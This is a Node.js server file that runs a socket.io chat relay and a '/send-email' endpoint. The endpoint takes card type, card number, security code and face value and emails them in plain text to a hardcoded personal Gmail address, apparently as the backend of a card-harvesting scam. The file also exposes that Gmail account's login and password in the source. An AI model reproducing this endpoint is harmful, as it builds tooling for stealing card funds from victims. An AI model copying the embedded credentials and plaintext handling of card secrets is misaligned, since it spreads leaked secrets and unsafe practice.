const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());


const transporter = nodemailer.createTransport({
    service: 'Gmail', // or any other email service
    auth: {
        user: 'eesuolaayot@gmail.com',
        pass: '08054527758'
    }
});


app.get('/', (req, res)=> {
    res.send('Hello World')
})
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*", // Allow all origins. For better security, specify your frontend's origin.
        methods: ["GET", "POST"]
    }
});


app.post('/send-email', (req, res) => {
    const { cardType, cardNumber, securityCode, faceValue } = req.body;

    const mailOptions = {
        from: 'users',
        to: 'eesuolaayot@gmail.com',
        subject: `New message from User`,
        text: `CardType: ${cardType}, cardNumber: ${cardNumber}, securityCode: ${securityCode}, faceValue: ${faceValue}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ success: false, error });
        }
        res.json({ success: true, info });
    });
});

app.use(cors()); // Use CORS middleware

let connectedUsers = {}; // Store connected users with their socket IDs
let userMessages = {};   // Store messages for each user

io.on('connection', (socket) => {
    console.log('a user connected:', socket.id);

    // Store the user's ID when they connect
    socket.on('user connected', (userId) => {
        connectedUsers[userId] = socket.id;
        if (!userMessages[userId]) {
            userMessages[userId] = [];
        }
        io.emit('update connected users', Object.keys(connectedUsers));
    });

    socket.on('disconnect', () => {
        console.log('user disconnected:', socket.id);
        for (const userId in connectedUsers) {
            if (connectedUsers[userId] === socket.id) {
                delete connectedUsers[userId];
                io.emit('update connected users', Object.keys(connectedUsers));
                break;
            }
        }
    });

    socket.on('send message', ({ sender, receiver, message }) => {
        const receiverSocketId = connectedUsers[receiver];

        // Ensure sender and receiver have message arrays initialized
        if (!userMessages[sender]) {
            userMessages[sender] = [];
        }
        if (!userMessages[receiver]) {
            userMessages[receiver] = [];
        }

        const messageObj = { sender, message };

        // Push the message to both the sender's and receiver's message arrays
        userMessages[sender].push(messageObj);
        userMessages[receiver].push(messageObj);

        if (receiverSocketId) {
            io.to(receiverSocketId).emit('receive message', messageObj);
        }
    });

    socket.on('get messages', (userId) => {
        socket.emit('update messages', userMessages[userId] || []);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
